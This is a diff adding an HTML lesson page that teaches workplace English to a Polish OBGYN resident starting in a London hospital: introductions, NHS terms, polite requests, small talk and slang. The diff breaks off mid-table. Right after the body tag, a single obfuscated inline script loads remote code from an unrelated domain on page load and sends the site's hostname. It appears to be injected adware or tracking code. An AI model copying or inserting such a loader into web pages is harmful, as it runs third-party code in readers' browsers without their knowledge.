@@ -1,0 +1,887 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The London Registrar | Lesson 13: The London Arrival</title>
+    <style>
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            /* THEME: British Royal Blue & Pillarbox Red */
+            --teal: #0033A0;       /* Royal Blue */
+            --teal-dark: #002266;
+            --teal-light: #4D79FF;
+            --navy: #001A4D;       /* Deep Navy */
+            --slate: #1A233A;
+            --rose: #C8102E;       /* Pillarbox Red */
+            --rose-light: #E84C65;
+            --gold: #FFD700;       /* Gold */
+            --gold-light: #FFE666;
+            --cream: #F0F4F8;      /* Light Blue Tint */
+            --light-bg: #FAFBFC;
+            --white: #FFFFFF;
+            --gray-100: #F1F5F9;
+            --gray-200: #E2E8F0;
+            --gray-400: #94A3B8;
+            --gray-600: #475569;
+            --gray-800: #1E293B;
+            
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+            --shadow-md: 0 4px 16px rgba(0,0,0,0.1);
+            --shadow-lg: 0 12px 40px rgba(0,0,0,0.12);
+            --shadow-xl: 0 20px 60px rgba(0,34,102,0.15);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 20px;
+            --radius-xl: 28px;
+
+            /* Highlight Colors */
+            --highlight-bg: #FFF59D;
+            --highlight-text: #BF360C;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', Helvetica, Arial, sans-serif;
+            line-height: 1.7;
+            color: var(--gray-800);
+            background-color: var(--light-bg);
+            overflow-x: hidden;
+        }
+
+        /* ====== HERO SECTION ====== */
+        .hero {
+            position: relative;
+            background: linear-gradient(135deg, var(--navy) 0%, var(--teal-dark) 40%, var(--teal) 100%);
+            color: var(--white);
+            padding: 100px 24px 80px;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -100px;
+            right: -100px;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(200, 16, 46, 0.25) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .hero::after {
+            content: '';
+            position: absolute;
+            bottom: -60px;
+            left: -60px;
+            width: 300px;
+            height: 300px;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.15) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+            max-width: 820px;
+            margin: 0 auto;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.12);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(255,255,255,0.2);
+            color: var(--gold-light);
+            padding: 6px 20px;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+        }
+
+        .hero h1 {
+            font-size: clamp(2.2rem, 5vw, 3.8rem);
+            font-weight: 800;
+            line-height: 1.15;
+            margin-bottom: 12px;
+            letter-spacing: -1px;
+        }
+
+        .hero h1 span { color: var(--rose); }
+
+        .hero-subtitle {
+            font-size: clamp(1.05rem, 2vw, 1.3rem);
+            color: rgba(255,255,255,0.85);
+            max-width: 620px;
+            margin: 0 auto 36px;
+            font-weight: 400;
+        }
+
+        .hero-cta {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--rose);
+            color: var(--white);
+            text-decoration: none;
+            padding: 14px 32px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1rem;
+            transition: background 0.25s, transform 0.2s;
+            box-shadow: 0 4px 20px rgba(200, 16, 46, 0.35);
+        }
+
+        .hero-cta:hover {
+            background: var(--rose-light);
+            transform: translateY(-2px);
+        }
+
+        .hero-cta svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .hero-ribbon {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 60px;
+            background: var(--light-bg);
+            clip-path: ellipse(55% 100% at 50% 100%);
+        }
+
+        /* ====== NAVIGATION ====== */
+        .nav-bar {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--gray-200);
+            padding: 0 24px;
+        }
+
+        .nav-inner {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 56px;
+        }
+
+        .nav-logo {
+            font-weight: 800;
+            font-size: 1rem;
+            color: var(--navy);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .nav-logo .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--rose);
+            border-radius: 50%;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 6px;
+            list-style: none;
+            overflow-x: auto;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--gray-600);
+            font-size: 0.82rem;
+            font-weight: 600;
+            padding: 6px 12px;
+            border-radius: 6px;
+            transition: color 0.2s, background 0.2s;
+            white-space: nowrap;
+        }
+
+        .nav-links a:hover {
+            color: var(--teal);
+            background: var(--gray-100);
+        }
+
+        /* ====== SECTION LAYOUT ====== */
+        .section {
+            padding: 80px 24px;
+        }
+
+        .section:nth-child(even) {
+            background: var(--white);
+        }
+
+        .section-inner {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .section-label {
+            display: inline-block;
+            font-size: 0.75rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: var(--teal);
+            background: rgba(0, 51, 160, 0.08);
+            padding: 4px 14px;
+            border-radius: 50px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            font-size: clamp(1.6rem, 3vw, 2.2rem);
+            font-weight: 800;
+            color: var(--navy);
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .section-desc {
+            color: var(--gray-600);
+            font-size: 1.05rem;
+            margin-bottom: 36px;
+            max-width: 640px;
+        }
+
+        /* ====== CARDS ====== */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 24px;
+            margin-top: 24px;
+        }
+
+        .card {
+            background: var(--white);
+            border: 1px solid var(--gray-200);
+            border-radius: var(--radius-lg);
+            padding: 28px;
+            transition: transform 0.25s, box-shadow 0.25s;
+        }
+
+        .card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .card h3 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--navy);
+            margin-bottom: 8px;
+        }
+
+        .card p {
+            font-size: 0.95rem;
+            color: var(--gray-600);
+            line-height: 1.6;
+        }
+
+        /* ====== PROMPT LIST (DISCUSSIONS) ====== */
+        .prompt-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-top: 24px;
+        }
+
+        .prompt-item {
+            background: var(--white);
+            border-left: 4px solid var(--teal);
+            border-radius: 0 var(--radius-md) var(--radius-md) 0;
+            padding: 24px 28px;
+            box-shadow: var(--shadow-sm);
+            transition: border-color 0.25s;
+        }
+
+        .prompt-item:hover { border-left-color: var(--rose); }
+
+        .prompt-item strong {
+            display: block;
+            color: var(--navy);
+            margin-bottom: 6px;
+            font-size: 1rem;
+        }
+
+        .prompt-item p {
+            color: var(--gray-600);
+            font-size: 0.95rem;
+            margin-bottom: 8px;
+        }
+
+        /* ====== TABLES ====== */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 24px;
+            font-size: 0.95rem;
+            border-radius: var(--radius-md);
+            overflow: hidden;
+            border: 1px solid var(--gray-200);
+        }
+
+        th {
+            background-color: var(--navy);
+            color: var(--white);
+            padding: 12px 16px;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        td {
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--gray-200);
+        }
+
+        tr:last-child td { border-bottom: none; }
+        tr:nth-child(even) { background-color: var(--gray-100); }
+
+        /* ====== INTERACTIVE ELEMENTS ====== */
+        .gap {
+            display: inline-block;
+            min-width: 80px;
+            border-bottom: 2px solid var(--teal-light);
+            color: var(--teal);
+            font-weight: bold;
+            padding: 0 0.5rem;
+            cursor: text;
+            background: rgba(0, 51, 160, 0.05);
+            border-radius: 4px;
+        }
+        
+        .gap:focus { outline: none; background: rgba(0, 51, 160, 0.1); }
+
+        /* ====== SPOILERS (BLURRED ANSWERS) ====== */
+        .spoiler {
+            filter: blur(5px);
+            cursor: pointer;
+            transition: filter 0.3s ease, background 0.3s, color 0.3s;
+            user-select: none;
+            background: #d1d5db; /* gray-300 */
+            border-radius: 4px;
+            padding: 2px 6px;
+            color: transparent;
+        }
+        
+        .spoiler.revealed {
+            filter: blur(0);
+            background: rgba(200, 16, 46, 0.1); /* light red */
+            color: var(--rose);
+            font-weight: 700;
+        }
+
+        /* ====== TRANSLATION TOOLTIPS ====== */
+        .trans-word {
+            border-bottom: 2px dashed var(--gold);
+            cursor: help;
+            position: relative;
+            display: inline-block;
+            font-weight: 700;
+            color: var(--navy);
+        }
+
+        .trans-word .tooltip {
+            visibility: hidden;
+            width: max-content;
+            max-width: 250px;
+            background-color: var(--slate);
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 6px 12px;
+            position: absolute;
+            z-index: 10;
+            bottom: 130%; 
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.2s;
+            font-size: 0.85rem;
+            font-weight: 600;
+            box-shadow: var(--shadow-md);
+        }
+
+        .trans-word .tooltip::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: var(--slate) transparent transparent transparent;
+        }
+
+        .trans-word.clicked .tooltip {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* ====== SAVE BUTTON ====== */
+        .save-btn {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background-color: var(--teal);
+            color: var(--white);
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 999px;
+            font-weight: 700;
+            box-shadow: var(--shadow-xl);
+            cursor: pointer;
+            transition: transform 0.2s;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .save-btn:hover {
+            transform: scale(1.05);
+            background-color: var(--navy);
+        }
+
+        /* ====== FOOTER ====== */
+        .footer {
+            background: var(--navy);
+            color: rgba(255,255,255,0.6);
+            text-align: center;
+            padding: 40px 24px;
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 768px) {
+            .hero { padding: 72px 20px 60px; }
+            .section { padding: 56px 16px; }
+            .nav-links { display: none; }
+        }
+    </style>
+</head>
+<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+
+<!-- SCRIPTS -->
+<script>
+    // Highlight History
+    const highlightStack = [];
+    document.addEventListener('keydown', function(e) {
+        if ((e.altKey || e.ctrlKey || e.metaKey) && (e.key === 'h' || e.key === 'H')) {
+            e.preventDefault(); 
+            const selection = window.getSelection();
+            if (!selection.rangeCount || selection.isCollapsed) return;
+            const range = selection.getRangeAt(0);
+            const span = document.createElement('span');
+            span.style.backgroundColor = "var(--highlight-bg)";
+            span.style.color = "var(--highlight-text)";
+            span.style.fontWeight = "bold";
+            span.style.padding = "2px 4px";
+            span.style.borderRadius = "4px";
+            try { range.surroundContents(span); highlightStack.push(span); selection.removeAllRanges(); } catch (error) {}
+        }
+        if ((e.metaKey || e.ctrlKey) && (e.key === 'z' || e.key === 'Z')) {
+            if (highlightStack.length > 0) {
+                e.preventDefault();
+                const lastSpan = highlightStack.pop();
+                if (document.body.contains(lastSpan)) {
+                    const parent = lastSpan.parentNode;
+                    while (lastSpan.firstChild) { parent.insertBefore(lastSpan.firstChild, lastSpan); }
+                    parent.removeChild(lastSpan);
+                }
+            }
+        }
+    });
+
+    // Save Doc
+    function saveDocument() {
+        const htmlContent = document.documentElement.outerHTML;
+        const blob = new Blob([htmlContent], {type: 'text/html'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'Lesson13_London_Arrival_Saved.html';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+    
+    // Toggle Spoilers & Translations
+    function toggleSpoiler(element) {
+        element.classList.toggle('revealed');
+    }
+    function toggleTrans(element) {
+        element.classList.toggle('clicked');
+    }
+</script>
+
+<!-- HERO -->
+<section class="hero">
+    <div class="hero-content">
+        <div class="hero-badge">The London Registrar Course</div>
+        <h1>The London <span>Arrival</span></h1>
+        <p class="hero-subtitle">Lesson 13 — 4 Days to Go. Today is entirely about speaking, surviving the first week, hospital logistics, and mastering British workplace politeness.</p>
+        <a href="#warmup" class="hero-cta">
+            Start Talking
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"></path></svg>
+        </a>
+    </div>
+    <div class="hero-ribbon"></div>
+</section>
+
+<!-- NAV -->
+<nav class="nav-bar">
+    <div class="nav-inner">
+        <a href="#" class="nav-logo"><span class="dot"></span> London Registrar</a>
+        <ul class="nav-links">
+            <li><a href="#warmup">1. The Countdown</a></li>
+            <li><a href="#pitch">2. The Intro</a></li>
+            <li><a href="#logistics">3. First Day</a></li>
+            <li><a href="#grammar">4-6. Politeness</a></li>
+            <li><a href="#smalltalk">7. Breakroom</a></li>
+            <li><a href="#roleplay1">8. Ward Manager</a></li>
+            <li><a href="#accents">9. Accents</a></li>
+            <li><a href="#slang">10. Slang</a></li>
+            <li><a href="#pub">11. Pub Culture</a></li>
+            <li><a href="#roleplay2">12-13. Patients</a></li>
+            <li><a href="#culture">14-15. Culture Shock</a></li>
+        </ul>
+    </div>
+</nav>
+
+<div contenteditable="true" style="outline: none;">
+
+    <!-- 1. WARM UP -->
+    <section class="section" id="warmup">
+        <div class="section-inner">
+            <span class="section-label">Task 1</span>
+            <h2 class="section-title">Warm Up: The Countdown ⏳</h2>
+            <p class="section-desc">You are leaving in exactly 4 days. Let's talk about the reality of the move.</p>
+
+            <div class="prompt-list">
+                <div class="prompt-item">
+                    <strong>1. The Packing Dilemma</strong>
+                    <p>What is the most useless thing you have packed? What is the one thing from Poland you absolutely could not leave behind?</p>
+                </div>
+                <div class="prompt-item">
+                    <strong>2. The Biggest Fear</strong>
+                    <p>Right now, what is making you the most nervous? Is it the medicine, the English, the bureaucracy, or navigating the London Underground?</p>
+                </div>
+                <div class="prompt-item">
+                    <strong>3. The Excitement</strong>
+                    <p>What is the very first thing you want to do or see once you have dropped your bags off at your new flat?</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 2. THE ELEVATOR PITCH -->
+    <section class="section" id="pitch">
+        <div class="section-inner">
+            <span class="section-label">Task 2</span>
+            <h2 class="section-title">The "Elevator Pitch" 🗣️</h2>
+            <p class="section-desc">You will meet dozens of people on your first day. You need a smooth, confident 30-second introduction.</p>
+
+            <div class="card" style="border-left: 4px solid var(--rose);">
+                <h3>Draft your introduction:&nbsp;<span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif; color: rgb(71, 85, 105); font-size: 15.2px;">Include:&nbsp;</span><strong style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif; color: rgb(71, 85, 105); font-size: 15.2px;">Your name, where you trained, your current level/role, and expressing enthusiasm.</strong></h3>
+                <p>Introduction #1: for Doctors&nbsp;</p>
+                <p><em>Example: "Hi everyone, I'm Alicja.&nbsp;</em><span style="font-size: 0.95rem; font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">I’m an OBGYN resident from Poland, and I’m thrilled to be joining the team here in London for my internship. Back home, I’ve been focusing particularly on </span><b data-path-to-node="5" data-index-in-node="188" style="font-size: 0.95rem; font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">fetal development</b><span style="font-size: 0.95rem; font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">. I’m really looking forward to learning how you manage <b>1st/2nd screening ultrasounds</b></span><span style="font-size: 0.95rem; font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">&nbsp;here and contributing to the department. Please feel free to give me any feedback as I get settled into the NHS system!</span></p><p><span style="font-size: 0.95rem; font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;"><br></span></p><p><span style="font-size: 0.95rem; font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;"><br></span></p><p><span style="font-size: 0.95rem; font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">* I'm really excited to be here and learn/observe from you. I'm sure it will be a huge contribution to my clinical knowledge.&nbsp;</span></p><p><span style="color: rgb(30, 41, 59); font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">Say it out loud 3 times until it feels natural.</span></p><p><span style="color: rgb(30, 41, 59); font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;"><br></span></p><p><b>Introduction #1: for Patients<span style="color: rgb(30, 41, 59); font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;"></span></b></p><p>Good morning, my name is Alicja.&nbsp;<span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">I’m an OBGYN resident from Poland visiting here for an internship. I work with Dr. Smith here. Would you mind if I stayed to observe your Ultrasound/Procedure for my clinical training? Please, don't feel pressured – it's completely up to you.&nbsp;</span></p><p><span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;"><br></span></p><p><span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">Some polite phrases:&nbsp;</span></p><p><span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">-&nbsp;</span><span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">Would you mind if I ....</span></p><p><span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">- Would you be comfortable with me doing ....</span></p><p>- May I have your permission to stay and observe...</p><p><span style="color: rgb(30, 41, 59); font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;"><br></span></p><p><span style="color: rgb(30, 41, 59); font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;"><br></span></p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 3. LOGISTICS VOCAB -->
+    <section class="section" id="logistics">
+        <div class="section-inner">
+            <span class="section-label">Task 3</span>
+            <h2 class="section-title">First Day Logistics 🏥</h2>
+            <p class="section-desc">Before you touch a patient, you need to navigate HR and IT. Match the UK hospital term to its meaning.</p>
+
+            <div class="card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th style="width: 40%">Term</th>
+                            <th>Meaning</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>1. <strong>Trust ID Badge / Swipe Card</strong></td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">Your security pass to open doors and access wards (department)</span></td>
+                        </tr>
+                        <tr>
+                            <td>2. <strong>Bleep / Pager</strong></td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">The device used to contact you urgently on call.</span></td>
+                        </tr>
+                        <tr>
+                            <td>3. <strong>Scrubs Machine / SmartCard</strong></td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">The automated machine where you collect clean surgical clothes.</span></td>
+                        </tr>
+                        <tr>
+                            <td>4. <strong>Smartcard (Spine IT)</strong></td>
+                            <td><span class="spoiler" onclick="toggleSpoiler(this)">The chip-card needed to log into NHS computer systems.</span></td>
+                        </tr>
+                        <tr>
+                            <td>5. <strong>Roster / Rota</strong></td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">Your work schedule (day shifts, nights, on-calls).</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- 4, 5, 6. GRAMMAR: POLITENESS -->
+    <section class="section" id="grammar">
+        <div class="section-inner">
+            <span class="section-label">Tasks 4, 5 &amp; 6</span>
+            <h2 class="section-title">Grammar: Extreme Politeness 🇬🇧</h2>
+            <div class="card" style="background-color: var(--cream);">
+                <p>In the NHS, speaking too directly is often interpreted as aggressive or rude. We use <strong>Indirect Questions</strong> and <strong>Softening Phrases</strong> to maintain good relationships with nurses and admin staff.</p>
+                <ul style="margin-left: 20px; margin-top: 10px;">
+                    <li><strong>Direct (Rude):</strong> "Where is the locker room?"</li>
+                    <li><strong>Indirect (Polite):</strong> "<b><u><i>Could you tell</i></u></b> me where the locker room is?" <em>(Notice the verb goes to the end!)</em></li>
+                    <li><strong>Direct (Bossy):</strong> "I need my login details."</li>
+                    <li><strong>Softened (Professional):</strong> "<b><u>I was wondering</u></b> if I could get my login details?"</li>
+                </ul><div><br></div><div>Phrases:&nbsp;</div><div><b><u><i>Could you tell/advise</i></u></b></div><div><b><u>I was wondering if</u></b><b><u><i></i></u></b></div><div><span style="color: rgb(71, 85, 105); font-size: 15.2px; background-color: rgb(255, 255, 255);">Would you mind telling me</span></div><div><b><u><br></u></b></div><div><em style="background-color: rgb(255, 255, 255); font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">Change these direct orders into polite requests.</em></div></div>
+            <div class="prompt-list">
+                <div class="prompt-item">
+                    "Give me the patient's notes." → <br>
+                    <em>Suggested:</em> <span class="spoiler revealed" onclick="toggleSpoiler(this)">"Could you pass me the patient's notes, please?"</span>
+                </div>
+                <div class="prompt-item">
+                    "Help me with this ultrasound machine." → <br>
+                    <em>Suggested:</em> <span class="spoiler revealed" onclick="toggleSpoiler(this)">"Would you mind helping me with this machine?"</span>
+                </div>
+                <div class="prompt-item">
+                    "I want a coffee." (To a colleague going to the kitchen) → <br>
+                    <em>Suggested:</em> <span class="spoiler revealed" onclick="toggleSpoiler(this)">"If you're making coffee, could I possibly have one too?"</span>
+                </div>
+            </div>
+
+            <h3 style="margin-top: 30px; color: var(--navy);">Task 6: Indirect Questions</h3>
+            <p><em>Change these direct questions into indirect ones. Remember the word order!</em></p>
+            <div class="prompt-list">
+                <div class="prompt-item">
+                    "What time <b><span style="background-color: var(--highlight-bg); color: var(--highlight-text); font-weight: bold; padding: 2px 4px; border-radius: 4px;">does</span></b> the morning handover start<b><span style="background-color: var(--highlight-bg); color: var(--highlight-text); font-weight: bold; padding: 2px 4px; border-radius: 4px;">?</span></b>" <br>
+                    <em>→ <b>Do you know</b>.</em>&nbsp;what time the morning <b>handover</b> start<b>s</b><em>&nbsp;..</em> <span class="spoiler revealed" onclick="toggleSpoiler(this)">what time the morning handover starts?</span>
+                </div>
+                <div class="prompt-item">
+                    "Where <span style="background-color: var(--highlight-bg); color: var(--highlight-text); font-weight: bold; padding: 2px 4px; border-radius: 4px;">is</span> the consultant's office?" <br>
+                    <i>→ </i><b style="">Could you tell me.</b><i>.where&nbsp;</i><span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">the consultant's office is<i>?&nbsp;</i></span><span style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">&nbsp;</span><span class="spoiler" style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;">where the consultant's office is?</span></div>
+                <div class="prompt-item">
+                    "How <span style="background-color: var(--highlight-bg); color: var(--highlight-text); font-weight: bold; padding: 2px 4px; border-radius: 4px;">do</span> I use the dictation software?" <br>
+                    <em>→ I was wondering if you could show me...</em> <span class="spoiler revealed" onclick="toggleSpoiler(this)">how to use the dictation software.</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 7. SMALL TALK -->
+    <section class="section" id="smalltalk">
+        <div class="section-inner">
+            <span class="section-label">Task 7</span>
+            <h2 class="section-title">The Breakroom: Small Talk ☕</h2>
+            <p class="section-desc">British workplace culture relies heavily on <span class="trans-word" onclick="toggleTrans(this)">small talk<span class="tooltip">pogawędka</span></span>. Practice answering these typical breakroom questions naturally.</p>
+
+            <div class="card-grid">
+                <div class="card">
+                    <h3>The Commute</h3>
+                    <p>"Morning! Terrible weather out there today. How was your journey in?"</p>
+                    <p><em>(Practice complaining mildly about the Tube/Traffic).</em></p>
+                </div>
+                <div class="card">
+                    <h3>The Weekend</h3>
+                    <p>"Thank God it's Friday. Have you got any nice plans for the weekend?"</p>
+                    <p><em>(Give a short answer, then return the question: "What about you?")</em></p>
+                </div>
+                <div class="card">
+                    <h3>The Settlement</h3>
+                    <p>"You just moved from Poland, right? Are you all settled (moved in/lived in) into your flat yet?"</p>
+                    <p><em>(Talk briefly about unpacking/IKEA/boxes).</em></p><p><em><br></em></p><p><em>in the vicinity</em></p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 8. ROLE PLAY WARD MANAGER -->
+    <section class="section" id="roleplay1">
+        <div class="section-inner">
+            <span class="section-label">Task 8</span>
+            <h2 class="section-title">Role Play: The Ward Sister 👑</h2>
+            <div class="card">
+                <p><strong>Context:</strong> The "Ward Sister" or "Ward Manager" (Lead Nurse) is the most powerful person on the ward. If you have a good relationship with her, your life will be easy.</p>
+                <p><strong>Scenario:</strong> It is your first shift on the Labour Ward. You need to introduce yourself to the Ward Sister (played by the teacher), ask her where you can put your bag, and ask for a quick tour of where the emergency equipment is kept.</p>
+                <p><em>Use your "Elevator Pitch" and your "Polite Grammar" from Tasks 2 &amp; 5.</em></p>
+            </div>
+        </div>
+    </section>
+
+    <!-- 9. ACCENTS -->
+    <section class="section" id="accents">
+        <div class="section-inner">
+            <span class="section-label">Task 9</span>
+            <h2 class="section-title">Dealing with Accents &amp; Misunderstandings 🗣️</h2>
+            <p class="section-desc">London hospitals have staff from all over the world. You <em>will</em> misunderstand people. How do you handle it professionally without saying "What?"</p>
+
+            <div class="prompt-list">
+                <div class="prompt-item">
+                    <strong>Instead of "What?" or "Repeat that":</strong>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>"I'm so sorry, I didn't quite catch that."</li>
+                        <li>"Could you just run that past me one more time?" - repeat&nbsp;</li>
+                        <li><strong style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif; display: inline !important;"><br></strong></li><li><strong style="font-family: &quot;Segoe UI&quot;, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif; display: inline !important;">Discussion:</strong></li></ul></div><div class="prompt-item">
+                    <p>How comfortable are you asking a senior consultant to repeat themselves? Practice saying: <em>"Sorry to interrupt, Mr. Smith, but could you clarify the dose for me?"</em></p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 10. SLANG -->
+    <section class="section" id="slang">
+        <div class="section-inner">
+            <span class="section-label">Task 10</span>
+            <h2 class="section-title">British Slang Survival Guide 🇬🇧</h2>
+            <p class="section-desc">Match the common UK slang/colloquialism to its meaning.</p>
+
+            <div class="card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th style="width: 40%">British Phrase</th>
+                            <th>Meaning</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>1. "I'm absolutely <strong><span style="background-color: var(--highlight-bg); color: var(--highlight-text); font-weight: bold; padding: 2px 4px; border-radius: 4px;">k</span>nackered</strong>."</td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">Exhausted / Very tired.</span></td>
+                        </tr>
+                        <tr>
+                            <td>2. "I'll put the <b>kettle</b><strong> on</strong>."</td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">I will boil water to make tea (usually to solve a crisis).</span></td>
+                        </tr>
+                        <tr>
+                            <td>3. "He's just <strong>taking the piss/mickey</strong>."</td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">Making fun of someone / joking around.</span></td>
+                        </tr>
+                        <tr>
+                            <td>4. "I was <strong>chuffed to bits</strong>."</td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">Very pleased or happy about something.</span></td>
+                        </tr>
+                        <tr>
+                            <td>5. "I just need to nip to the <strong>loo (WC)</strong>."</td>
+                            <td><span class="spoiler revealed" onclick="toggleSpoiler(this)">Go to the toilet/bathroom.</span></td>
+                        </tr>
+                        <tr>
